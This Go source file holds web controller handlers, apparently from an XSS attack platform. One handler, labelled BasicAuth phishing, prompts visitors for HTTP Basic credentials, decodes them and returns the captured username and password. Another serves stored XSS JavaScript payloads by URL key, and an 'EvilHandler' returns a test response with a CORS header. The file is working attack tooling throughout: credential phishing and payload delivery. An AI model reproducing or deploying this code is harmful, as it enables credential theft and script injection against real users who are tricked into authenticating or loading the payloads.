package controllers

import (
	"encoding/base64"
	"fmt"
	"strings"
	"xss/logic"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

// BasicAuthPhishHandler BasicAuth 钓鱼
// @Summary BasicAuth 钓鱼
// @Description BasicAuth 钓鱼
// @Tags 攻击相关接口
// @Param Authorization header string true "Base64编码的用户名和密码"
// @Security ApiKeyAuth
// @Success 200 {object} Resp
// @Router /basicAuth [get]
func BasicAuthPhishHandler(c *gin.Context) {
	//1.接收http请求头中的Authorization字段,如果没有该字段就提示用户进行BasicAuth 认证
	authorization := c.Request.Header.Get("Authorization")
	if authorization == "" {
		RespNeedBasicAuth(c)
		return
	}
	//2.对该字段进行base64解码
	var base64UsernamePassword string
	_, err := fmt.Sscanf(authorization, "Basic %s", &base64UsernamePassword)
	if err != nil {
		RespNeedBasicAuth(c)
		return
	}
	//3.将解码后的字符串拆分为用户名和密码
	usernamePassword, err := base64.StdEncoding.DecodeString(base64UsernamePassword)
	if err != nil {
		RespNeedBasicAuth(c)
		return
	}

	buffer := strings.Split(string(usernamePassword), ":")
	username := buffer[0]
	password := buffer[1]
	RespSuc(c, map[string]string{
		"username": username,
		"password": password,
	})
}

//ProvideXSSPayloadHandler 根据url_key提供对应项目的xss_payload
func ProvideXSSPayloadHandler(c *gin.Context) {
	URLKey := c.Param("url_key")
	payload, err := logic.ProvideXSSPayload(URLKey)
	if err != nil {
		zap.L().Error("logic.ProvideXSSPayload failed", zap.Error(err))
		RespErr(c, CodeServerBusy)
		return
	}
	RespJs(c, payload)
}

func EvilHandler(c *gin.Context) {
	c.Header("Access-Control-Allow-Origin", "http://localhost:8081")
	c.Data(200, "application/text", []byte("hello world"))
}
